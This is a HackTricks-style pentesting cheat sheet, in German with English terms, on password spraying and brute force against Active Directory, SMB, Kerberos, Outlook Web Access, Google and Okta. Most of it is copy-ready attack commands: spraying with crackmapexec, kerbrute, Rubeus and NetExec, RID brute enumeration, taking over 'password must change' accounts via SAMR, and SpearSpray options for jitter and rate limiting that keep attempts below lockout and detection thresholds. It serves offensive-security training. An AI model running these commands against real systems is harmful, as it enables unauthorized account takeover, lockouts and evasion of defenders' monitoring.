# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sobald Sie mehrere **valid usernames** gefunden haben, können Sie mit jedem der entdeckten Benutzer die gebräuchlichsten **common passwords** ausprobieren (achten Sie auf die **password policy** der Umgebung).\
Per **default** beträgt die **minimum** **password** **length** **7**.

Listen mit common usernames können ebenfalls nützlich sein: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Beachten Sie, dass Sie **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

Wenn Sie Benutzer-Credentials oder eine Shell als Domain-Benutzer haben, können Sie **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation von Linux (oder allen)

- Mit **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Verwendung von [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(Sie können die Anzahl der Versuche angeben, um Sperrungen zu vermeiden):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Verwendung von [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NICHT EMPFOHLEN, FUNKTIONIERT MANCHMAL NICHT
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Mit dem `scanner/smb/smb_login` Modul von **Metasploit**:

![](<../../images/image (745).png>)

- Mit **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Von Windows

- Mit einer [Rubeus](https://github.com/Zer1t0/Rubeus)-Version mit dem brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Mit [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Es kann standardmäßig Benutzer aus der Domäne erzeugen, liest die Passwort-Richtlinie aus der Domäne und begrenzt die Anzahl der Versuche entsprechend.)
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Mit [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifizieren und Übernehmen von "Password must change at next logon" Accounts (SAMR)

Eine geräuscharme Technik ist, ein benign/empty password zu sprayen und Accounts abzufangen, die STATUS_PASSWORD_MUST_CHANGE zurückgeben. Das zeigt an, dass das Passwort zwangsweise abgelaufen ist und ohne Kenntnis des alten Passworts geändert werden kann.

Ablauf:
- Benutzer enumerieren (RID brute via SAMR), um die Zielliste zu erstellen:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spraye ein leeres Passwort und fahre bei Treffern fort, um Konten zu übernehmen, die bei der nächsten Anmeldung zur Passwortänderung gezwungen werden:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Für jeden Treffer das Passwort über SAMR mit NetExec’s Modul ändern (altes Passwort nicht erforderlich, wenn "must change" gesetzt ist):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Betriebliche Hinweise:
- Stellen Sie sicher, dass die Uhr Ihres Hosts vor Kerberos-basierten Operationen mit dem DC synchronisiert ist: `sudo ntpdate <dc_fqdn>`.
- Ein [+] ohne (Pwn3d!) in einigen Modulen (z.B. RDP/WinRM) bedeutet, dass die creds gültig sind, das Konto jedoch keine Rechte für interaktives Anmelden hat.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying mit LDAP-Targeting und PSO-aware Throttling (SpearSpray)

Kerberos pre-auth–based spraying reduziert das Rauschen gegenüber SMB/NTLM/LDAP-Bind-Versuchen und richtet sich besser nach AD-Lockout-Policies. SpearSpray koppelt LDAP-gesteuertes Targeting, eine Pattern-Engine und Policy-Awareness (domain policy + PSOs + badPwdCount buffer), um präzise und sicher zu sprühen. Es kann außerdem kompromittierte Principals in Neo4j markieren, um Pfade in BloodHound nachzuzeichnen.

Key ideas:
- LDAP user discovery mit Paging und LDAPS-Unterstützung, optional mit benutzerdefinierten LDAP-Filtern.
- Domain lockout policy + PSO-aware Filterung, um einen konfigurierbaren Versuchspuffer (threshold) zu lassen und zu vermeiden, dass Benutzer gesperrt werden.
- Kerberos pre-auth Validierung unter Verwendung schneller gssapi bindings (erzeugt 4768/4771 auf DCs statt 4625).
- Musterbasierte, pro-Benutzer Passwortgenerierung unter Verwendung von Variablen wie Namen und zeitlichen Werten, abgeleitet aus dem pwdLastSet jedes Benutzers.
- Durchsatzkontrolle mit Threads, Jitter und max requests per second.
- Optionale Neo4j-Integration zum Markieren übernommener Benutzer für BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Zielausrichtung und Musterkontrolle:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth- und Sicherheitskontrollen:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound Anreicherung:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Übersicht des Pattern-Systems (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Verfügbare Variablen umfassen:
- {name}, {samaccountname}
- Zeitbasierte Werte aus pwdLastSet (oder whenCreated) jedes Benutzers: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Kompositions-Helfer und Org-Token: {separator}, {suffix}, {extra}

Betriebliche Hinweise:
- Bevorzuge Abfragen des PDC-emulator mit -dc, um den maßgeblichsten badPwdCount und richtlinienbezogene Informationen zu lesen.
- Resets von badPwdCount werden beim nächsten Versuch nach dem Beobachtungsfenster ausgelöst; nutze Schwellenwerte und Timing, um sicher zu bleiben.
- Kerberos pre-auth attempts sind in der DC-Telemetrie als 4768/4771 sichtbar; verwende Jitter und Rate-Limiting, um dich anzupassen.

> Tipp: SpearSpray’s default LDAP page size ist 200; passe bei Bedarf mit -lps an.

## Outlook Web Access

Es gibt mehrere Tools für p**assword spraying outlook**.

- Mit [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Mit [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Mit [Ruler](https://github.com/sensepost/ruler) (reliable!)
- Mit [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Mit [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Um eines dieser Tools zu verwenden, benötigen Sie eine Benutzerliste und ein Passwort / eine kleine Liste von Passwörtern to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referenzen

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
